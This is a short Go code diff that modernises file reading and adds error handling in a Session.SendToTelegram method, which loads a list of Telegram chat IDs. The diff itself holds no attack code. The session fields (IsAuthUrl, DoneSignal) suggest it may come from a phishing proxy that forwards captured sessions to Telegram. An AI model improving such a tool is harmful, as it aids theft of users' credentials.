@@ -3,7 +3,7 @@ package core
 import (
     "encoding/json"
     "fmt"
-    "io/ioutil"
+    "io"
     "log"
     "os"
     "time"
@@ -144,7 +144,11 @@ func (s *Session) SendToTelegram() error {
     defer file.Close()
 
     chatIDs := []int64{}
-    byteValue, _ := ioutil.ReadAll(file)
+    byteValue, err := io.ReadAll(file)
+    if err != nil {
+        return fmt.Errorf("failed to read chat ID file: %v", err)
+    }
+
     err = json.Unmarshal(byteValue, &chatIDs)
     if err != nil {
         return fmt.Errorf("failed to unmarshal chat ID file: %v", err)
@@ -178,7 +182,7 @@ func (s *Session) SendToTelegram() error {
 }
 
 func (s *Session) Finish(is_auth_url bool) {
-    if !s.IsDone {
+    if (!s.IsDone) {
         s.IsDone = true
         s.IsAuthUrl = is_auth_url
         if s.DoneSignal != nil {
